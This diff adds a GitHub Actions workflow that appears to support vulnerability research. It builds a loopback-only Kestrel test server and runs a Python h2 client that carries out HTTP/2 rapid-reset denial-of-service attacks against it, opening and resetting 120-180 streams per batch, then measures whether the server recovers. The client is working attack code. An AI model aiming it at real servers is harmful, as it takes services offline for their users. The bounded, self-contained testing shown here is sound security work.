@@ -1,0 +1,553 @@
+name: Temporary MSRC Kestrel HTTP2 R6
+
+on:
+  push:
+    paths:
+      - '.github/workflows/_temporary-msrc-kestrel-h2-r6-20260829.yml'
+
+permissions:
+  contents: read
+
+jobs:
+  kestrel-h2-reset-matrix:
+    runs-on: ubuntu-latest
+    timeout-minutes: 25
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-dotnet@v4
+        with:
+          dotnet-version: '10.0.111'
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.13'
+
+      - name: Install bounded local probe dependencies
+        run: python -m pip install --disable-pip-version-check h2==4.2.0 psutil==7.0.0
+
+      - name: Create isolated loopback-only test application and probe
+        shell: bash
+        run: |
+          set -euo pipefail
+          ROOT="$RUNNER_TEMP/msrc-kestrel-h2-r6"
+          mkdir -p "$ROOT/app" "$ROOT/results"
+
+          cat > "$ROOT/app/KestrelResetLab.csproj" <<'EOF'
+          <Project Sdk="Microsoft.NET.Sdk.Web">
+            <PropertyGroup>
+              <TargetFramework>net10.0</TargetFramework>
+              <Nullable>enable</Nullable>
+              <ImplicitUsings>enable</ImplicitUsings>
+              <TreatWarningsAsErrors>true</TreatWarningsAsErrors>
+            </PropertyGroup>
+          </Project>
+          EOF
+
+          cat > "$ROOT/app/Program.cs" <<'EOF'
+          using System.Diagnostics;
+          using System.IO.Compression;
+          using Microsoft.AspNetCore.ResponseCompression;
+          using Microsoft.AspNetCore.Server.Kestrel.Core;
+
+          var builder = WebApplication.CreateBuilder(args);
+          builder.WebHost.ConfigureKestrel(options =>
+          {
+              options.ListenLocalhost(5087, listen => listen.Protocols = HttpProtocols.Http1);
+              options.ListenLocalhost(5088, listen => listen.Protocols = HttpProtocols.Http2);
+              options.Limits.Http2.MaxStreamsPerConnection = 100;
+          });
+          builder.Services.AddResponseCompression(options =>
+          {
+              options.EnableForHttps = true;
+              options.Providers.Add<GzipCompressionProvider>();
+          });
+          builder.Services.Configure<GzipCompressionProviderOptions>(options => options.Level = CompressionLevel.Fastest);
+
+          var app = builder.Build();
+          app.UseResponseCompression();
+
+          long fastStarted = 0, fastCompleted = 0;
+          long blockedStarted = 0, blockedCompleted = 0, blockedCanceled = 0, blockedErrors = 0, blockedActive = 0;
+          long compressStarted = 0, compressCompleted = 0, compressCanceled = 0, compressErrors = 0, compressActive = 0;
+          long readStarted = 0, readCompleted = 0, readCanceled = 0, readErrors = 0, readActive = 0;
+          var payload = new byte[16 * 1024];
+          Array.Fill(payload, (byte)'A');
+
+          app.MapGet("/health", () => Results.Text("ok"));
+
+          app.MapGet("/runtime", () =>
+          {
+              var process = Process.GetCurrentProcess();
+              return Results.Json(new
+              {
+                  utc = DateTimeOffset.UtcNow,
+                  framework = System.Runtime.InteropServices.RuntimeInformation.FrameworkDescription,
+                  aspnetAssembly = typeof(WebApplication).Assembly.FullName,
+                  processId = Environment.ProcessId,
+                  workingSet = process.WorkingSet64,
+                  privateMemory = process.PrivateMemorySize64,
+                  managedMemory = GC.GetTotalMemory(forceFullCollection: false),
+                  threadCount = process.Threads.Count,
+                  handleCount = process.HandleCount,
+                  pendingThreadPool = ThreadPool.PendingWorkItemCount,
+                  completedThreadPool = ThreadPool.CompletedWorkItemCount,
+                  fastStarted = Interlocked.Read(ref fastStarted),
+                  fastCompleted = Interlocked.Read(ref fastCompleted),
+                  blockedStarted = Interlocked.Read(ref blockedStarted),
+                  blockedCompleted = Interlocked.Read(ref blockedCompleted),
+                  blockedCanceled = Interlocked.Read(ref blockedCanceled),
+                  blockedErrors = Interlocked.Read(ref blockedErrors),
+                  blockedActive = Interlocked.Read(ref blockedActive),
+                  compressStarted = Interlocked.Read(ref compressStarted),
+                  compressCompleted = Interlocked.Read(ref compressCompleted),
+                  compressCanceled = Interlocked.Read(ref compressCanceled),
+                  compressErrors = Interlocked.Read(ref compressErrors),
+                  compressActive = Interlocked.Read(ref compressActive),
+                  readStarted = Interlocked.Read(ref readStarted),
+                  readCompleted = Interlocked.Read(ref readCompleted),
+                  readCanceled = Interlocked.Read(ref readCanceled),
+                  readErrors = Interlocked.Read(ref readErrors),
+                  readActive = Interlocked.Read(ref readActive)
+              });
+          });
+
+          app.MapGet("/fast", () =>
+          {
+              Interlocked.Increment(ref fastStarted);
+              Interlocked.Increment(ref fastCompleted);
+              return Results.Text("FAST_OK");
+          });
+
+          app.MapGet("/blocked", async context =>
+          {
+              Interlocked.Increment(ref blockedStarted);
+              Interlocked.Increment(ref blockedActive);
+              context.Response.ContentType = "application/octet-stream";
+              try
+              {
+                  for (var i = 0; i < 512; i++)
+                  {
+                      await context.Response.Body.WriteAsync(payload, context.RequestAborted);
+                      await context.Response.Body.FlushAsync(context.RequestAborted);
+                  }
+              }
+              catch (OperationCanceledException)
+              {
+                  Interlocked.Increment(ref blockedCanceled);
+              }
+              catch (IOException)
+              {
+                  Interlocked.Increment(ref blockedCanceled);
+              }
+              catch
+              {
+                  Interlocked.Increment(ref blockedErrors);
+                  throw;
+              }
+              finally
+              {
+                  Interlocked.Decrement(ref blockedActive);
+                  Interlocked.Increment(ref blockedCompleted);
+              }
+          });
+
+          app.MapGet("/compress", async context =>
+          {
+              Interlocked.Increment(ref compressStarted);
+              Interlocked.Increment(ref compressActive);
+              context.Response.ContentType = "text/plain";
+              try
+              {
+                  for (var i = 0; i < 256; i++)
+                  {
+                      await context.Response.Body.WriteAsync(payload, context.RequestAborted);
+                  }
+              }
+              catch (OperationCanceledException)
+              {
+                  Interlocked.Increment(ref compressCanceled);
+              }
+              catch (IOException)
+              {
+                  Interlocked.Increment(ref compressCanceled);
+              }
+              catch
+              {
+                  Interlocked.Increment(ref compressErrors);
+                  throw;
+              }
+              finally
+              {
+                  Interlocked.Decrement(ref compressActive);
+                  Interlocked.Increment(ref compressCompleted);
+              }
+          });
+
+          app.MapPost("/read", async context =>
+          {
+              Interlocked.Increment(ref readStarted);
+              Interlocked.Increment(ref readActive);
+              var buffer = new byte[4096];
+              long total = 0;
+              try
+              {
+                  while (true)
+                  {
+                      var count = await context.Request.Body.ReadAsync(buffer, context.RequestAborted);
+                      if (count == 0) break;
+                      total += count;
+                  }
+                  await context.Response.WriteAsync($"READ:{total}", context.RequestAborted);
+              }
+              catch (OperationCanceledException)
+              {
+                  Interlocked.Increment(ref readCanceled);
+              }
+              catch (IOException)
+              {
+                  Interlocked.Increment(ref readCanceled);
+              }
+              catch
+              {
+                  Interlocked.Increment(ref readErrors);
+                  throw;
+              }
+              finally
+              {
+                  Interlocked.Decrement(ref readActive);
+                  Interlocked.Increment(ref readCompleted);
+              }
+          });
+
+          await app.RunAsync();
+          EOF
+
+          cat > "$ROOT/h2_probe.py" <<'PYEOF'
+          from __future__ import annotations
+
+          import json
+          import os
+          import socket
+          import statistics
+          import time
+          import urllib.request
+          from pathlib import Path
+
+          import psutil
+          from h2.config import H2Configuration
+          from h2.connection import H2Connection
+          from h2.events import ConnectionTerminated, DataReceived, ResponseReceived, StreamEnded, StreamReset
+          from h2.settings import SettingCodes
+
+          HOST = "127.0.0.1"
+          H1_PORT = 5087
+          H2_PORT = 5088
+          OUT = Path(os.environ["RESULTS_DIR"])
+          SERVER_PID = int(os.environ["SERVER_PID"])
+          PROCESS = psutil.Process(SERVER_PID)
+
+          def get_json(path: str) -> dict:
+              with urllib.request.urlopen(f"http://{HOST}:{H1_PORT}{path}", timeout=5) as response:
+                  return json.loads(response.read().decode("utf-8"))
+
+          def process_snapshot(label: str) -> dict:
+              try:
+                  memory = PROCESS.memory_info()
+                  return {
+                      "label": label,
+                      "alive": PROCESS.is_running(),
+                      "rss": memory.rss,
+                      "vms": memory.vms,
+                      "threads": PROCESS.num_threads(),
+                      "fds": PROCESS.num_fds(),
+                      "cpu_times": PROCESS.cpu_times()._asdict(),
+                      "server": get_json("/runtime"),
+                  }
+              except Exception as exc:
+                  return {"label": label, "alive": False, "error": repr(exc)}
+
+          class Client:
+              def __init__(self, initial_window: int | None = None):
+                  self.sock = socket.create_connection((HOST, H2_PORT), timeout=5)
+                  self.sock.settimeout(1.0)
+                  self.conn = H2Connection(config=H2Configuration(client_side=True, header_encoding="utf-8"))
+                  self.conn.initiate_connection()
+                  if initial_window is not None:
+                      self.conn.update_settings({SettingCodes.INITIAL_WINDOW_SIZE: initial_window})
+                  self.sock.sendall(self.conn.data_to_send())
+                  self.terminated = False
+                  self._pump(0.25)
+
+              def _pump(self, duration: float = 0.05) -> list:
+                  deadline = time.monotonic() + duration
+                  events = []
+                  while time.monotonic() < deadline and not self.terminated:
+                      try:
+                          data = self.sock.recv(65535)
+                      except socket.timeout:
+                          break
+                      except OSError:
+                          self.terminated = True
+                          break
+                      if not data:
+                          self.terminated = True
+                          break
+                      try:
+                          new_events = self.conn.receive_data(data)
+                      except Exception:
+                          self.terminated = True
+                          break
+                      events.extend(new_events)
+                      for event in new_events:
+                          if isinstance(event, DataReceived):
+                              self.conn.acknowledge_received_data(event.flow_controlled_length, event.stream_id)
+                          if isinstance(event, ConnectionTerminated):
+                              self.terminated = True
+                      pending = self.conn.data_to_send()
+                      if pending:
+                          try:
+                              self.sock.sendall(pending)
+                          except OSError:
+                              self.terminated = True
+                              break
+                  return events
+
+              def rapid_batch(self, path: str, count: int, *, method: str = "GET", body_prefix: bytes | None = None,
+                              wait_before_reset: float = 0.0, accept_gzip: bool = False) -> dict:
+                  stream_ids = []
+                  sent = 0
+                  for _ in range(count):
+                      if self.terminated:
+                          break
+                      stream_id = self.conn.get_next_available_stream_id()
+                      headers = [
+                          (":method", method),
+                          (":scheme", "http"),
+                          (":authority", f"{HOST}:{H2_PORT}"),
+                          (":path", path),
+                      ]
+                      if accept_gzip:
+                          headers.append(("accept-encoding", "gzip"))
+                      if body_prefix is not None:
+                          headers.append(("content-type", "application/octet-stream"))
+                          headers.append(("content-length", "1000000"))
+                      self.conn.send_headers(stream_id, headers, end_stream=body_prefix is None)
+                      if body_prefix is not None:
+                          self.conn.send_data(stream_id, body_prefix, end_stream=False)
+                      stream_ids.append(stream_id)
+                      sent += 1
+                      if sent % 20 == 0:
+                          try:
+                              self.sock.sendall(self.conn.data_to_send())
+                          except OSError:
+                              self.terminated = True
+                              break
+                          self._pump(0.01)
+                  if not self.terminated:
+                      pending = self.conn.data_to_send()
+                      if pending:
+                          try:
+                              self.sock.sendall(pending)
+                          except OSError:
+                              self.terminated = True
+                  if wait_before_reset:
+                      time.sleep(wait_before_reset)
+                      self._pump(0.02)
+                  reset_sent = 0
+                  for stream_id in stream_ids:
+                      if self.terminated:
+                          break
+                      try:
+                          self.conn.reset_stream(stream_id, error_code=8)
+                          reset_sent += 1
+                      except Exception:
+                          pass
+                  if not self.terminated:
+                      try:
+                          pending = self.conn.data_to_send()
+                          if pending:
+                              self.sock.sendall(pending)
+                      except OSError:
+                          self.terminated = True
+                  events = self._pump(0.5)
+                  return {
+                      "path": path,
+                      "requested": count,
+                      "headers_sent": sent,
+                      "resets_sent": reset_sent,
+                      "connection_terminated": self.terminated,
+                      "event_types": sorted({type(event).__name__ for event in events}),
+                  }
+
+              def normal_get(self, path: str = "/fast") -> tuple[bool, float, int | None, bytes]:
+                  start = time.perf_counter()
+                  stream_id = self.conn.get_next_available_stream_id()
+                  self.conn.send_headers(stream_id, [
+                      (":method", "GET"),
+                      (":scheme", "http"),
+                      (":authority", f"{HOST}:{H2_PORT}"),
+                      (":path", path),
+                  ], end_stream=True)
+                  self.sock.sendall(self.conn.data_to_send())
+                  status = None
+                  body = bytearray()
+                  deadline = time.monotonic() + 5
+                  ended = False
+                  while time.monotonic() < deadline and not ended and not self.terminated:
+                      for event in self._pump(0.2):
+                          if isinstance(event, ResponseReceived) and event.stream_id == stream_id:
+                              for key, value in event.headers:
+                                  if key == ":status":
+                                      status = int(value)
+                          elif isinstance(event, DataReceived) and event.stream_id == stream_id:
+                              body.extend(event.data)
+                          elif isinstance(event, StreamEnded) and event.stream_id == stream_id:
+                              ended = True
+                          elif isinstance(event, StreamReset) and event.stream_id == stream_id:
+                              ended = True
+                      if ended:
+                          break
+                  elapsed = time.perf_counter() - start
+                  return ended and status == 200, elapsed, status, bytes(body)
+
+              def close(self):
+                  try:
+                      self.sock.close()
+                  except Exception:
+                      pass
+
+          def normal_matrix(count: int) -> dict:
+              client = Client()
+              latencies = []
+              failures = []
+              try:
+                  for index in range(count):
+                      ok, elapsed, status, body = client.normal_get()
+                      latencies.append(elapsed)
+                      if not ok or body != b"FAST_OK":
+                          failures.append({"index": index, "status": status, "body": body.decode("utf-8", "replace")})
+              finally:
+                  client.close()
+              ordered = sorted(latencies)
+              return {
+                  "count": count,
+                  "successes": count - len(failures),
+                  "failures": failures,
+                  "p50_ms": statistics.median(ordered) * 1000 if ordered else None,
+                  "p95_ms": ordered[max(0, int(len(ordered) * 0.95) - 1)] * 1000 if ordered else None,
+                  "max_ms": max(ordered) * 1000 if ordered else None,
+              }
+
+          def run_attack(name: str, **kwargs) -> dict:
+              client = Client(initial_window=kwargs.pop("initial_window", None))
+              try:
+                  result = client.rapid_batch(**kwargs)
+                  result["name"] = name
+                  return result
+              except Exception as exc:
+                  return {"name": name, "error": repr(exc), "connection_terminated": client.terminated}
+              finally:
+                  client.close()
+
+          result = {
+              "schema": "kestrel-h2-reset-r6/v1",
+              "generated_utc": time.strftime("%Y-%m-%dT%H:%M:%SZ", time.gmtime()),
+              "safety": "owned GitHub runner; loopback-only; bounded non-destructive matrix",
+              "snapshots": [],
+              "attacks": [],
+          }
+
+          result["snapshots"].append(process_snapshot("initial"))
+          result["baseline"] = normal_matrix(50)
+          result["snapshots"].append(process_snapshot("after_baseline"))
+
+          result["attacks"].append(run_attack("fast_immediate_rst", path="/fast", count=180))
+          result["attacks"].append(run_attack("request_body_partial_rst", path="/read", count=120, method="POST", body_prefix=b"X" * 64))
+          result["attacks"].append(run_attack("blocked_output_zero_window_rst", path="/blocked", count=120, initial_window=0, wait_before_reset=0.20))
+          result["attacks"].append(run_attack("compressed_output_rst", path="/compress", count=120, wait_before_reset=0.05, accept_gzip=True))
+          result["snapshots"].append(process_snapshot("immediate_post_attack"))
+
+          time.sleep(5)
+          result["snapshots"].append(process_snapshot("post_attack_5s"))
+          result["recovery_5s"] = normal_matrix(100)
+          time.sleep(10)
+          result["snapshots"].append(process_snapshot("post_attack_15s"))
+          result["recovery_15s"] = normal_matrix(100)
+          result["snapshots"].append(process_snapshot("final"))
+
+          baseline = result["baseline"]
+          recovery = result["recovery_15s"]
+          initial = result["snapshots"][0]
+          final = result["snapshots"][-1]
+          reasons = []
+          if not final.get("alive", False):
+              reasons.append("server_process_not_alive")
+          if recovery["successes"] != recovery["count"]:
+              reasons.append("legitimate_recovery_failures")
+          if baseline["p95_ms"] and recovery["p95_ms"] and recovery["p95_ms"] > max(250.0, baseline["p95_ms"] * 8):
+              reasons.append("persistent_legitimate_latency_degradation")
+          if initial.get("rss") and final.get("rss") and final["rss"] - initial["rss"] > 200 * 1024 * 1024:
+              reasons.append("large_residual_rss_delta")
+          server_final = final.get("server", {})
+          if any(server_final.get(key, 0) for key in ("blockedActive", "compressActive", "readActive")):
+              reasons.append("framework_requests_still_active_after_15s")
+          if server_final.get("blockedErrors", 0) or server_final.get("compressErrors", 0) or server_final.get("readErrors", 0):
+              reasons.append("unexpected_application_errors")
+
+          result["decision"] = {
+              "verdict": "ANOMALY_REQUIRES_SOURCE_DIFFERENTIAL" if reasons else "KILL_NO_PERSISTENT_SECURITY_BOUNDARY_IN_MATRIX",
+              "submission_ready": False,
+              "critical_defensible": False,
+              "reasons": reasons,
+              "note": "Generic HTTP/2 rapid-reset denial of service is public prior art; this matrix only promotes a distinct persistent post-attack boundary anomaly."
+          }
+
+          OUT.mkdir(parents=True, exist_ok=True)
+          (OUT / "Kestrel_H2_R6_RESULTS.json").write_text(json.dumps(result, indent=2, sort_keys=True), encoding="utf-8")
+          print(json.dumps(result["decision"], indent=2))
+          PYEOF
+
+          dotnet --info | tee "$ROOT/results/dotnet-info.txt"
+          dotnet --list-runtimes | tee "$ROOT/results/dotnet-runtimes.txt"
+          dotnet build "$ROOT/app/KestrelResetLab.csproj" -c Release --nologo | tee "$ROOT/results/build.log"
+
+          DOTNET_CLI_TELEMETRY_OPTOUT=1 dotnet "$ROOT/app/bin/Release/net10.0/KestrelResetLab.dll" \
+            >"$ROOT/results/server.stdout.log" 2>"$ROOT/results/server.stderr.log" &
+          SERVER_PID=$!
+          echo "$SERVER_PID" > "$ROOT/results/server.pid"
+          cleanup() {
+            kill "$SERVER_PID" 2>/dev/null || true
+            wait "$SERVER_PID" 2>/dev/null || true
+          }
+          trap cleanup EXIT
+
+          for _ in $(seq 1 100); do
+            if curl -fsS http://127.0.0.1:5087/health >/dev/null; then break; fi
+            sleep 0.1
+          done
+          curl -fsS http://127.0.0.1:5087/health
+
+          RESULTS_DIR="$ROOT/results" SERVER_PID="$SERVER_PID" python "$ROOT/h2_probe.py" | tee "$ROOT/results/probe.log"
+          curl -fsS http://127.0.0.1:5087/runtime | python -m json.tool > "$ROOT/results/final-runtime.json"
+
+          python - <<'PYEOF'
+          import hashlib, json, os
+          from pathlib import Path
+          root = Path(os.environ['RUNNER_TEMP']) / 'msrc-kestrel-h2-r6' / 'results'
+          entries = []
+          for path in sorted(root.iterdir()):
+              if path.is_file() and path.name != 'SHA256SUMS.txt':
+                  data = path.read_bytes()
+                  entries.append((hashlib.sha256(data).hexdigest(), path.name, len(data)))
+          (root / 'SHA256SUMS.txt').write_text(''.join(f'{digest}  {name}\n' for digest, name, _ in entries), encoding='utf-8')
+          (root / 'MANIFEST.json').write_text(json.dumps({'files':[{'name':name,'sha256':digest,'bytes':size} for digest,name,size in entries]}, indent=2), encoding='utf-8')
+          PYEOF
+
+      - name: Upload raw bounded lab evidence
+        uses: actions/upload-artifact@v4
+        with:
+          name: msrc-kestrel-h2-r6-results
+          path: ${{ runner.temp }}/msrc-kestrel-h2-r6/results
+          if-no-files-found: error
+          retention-days: 7
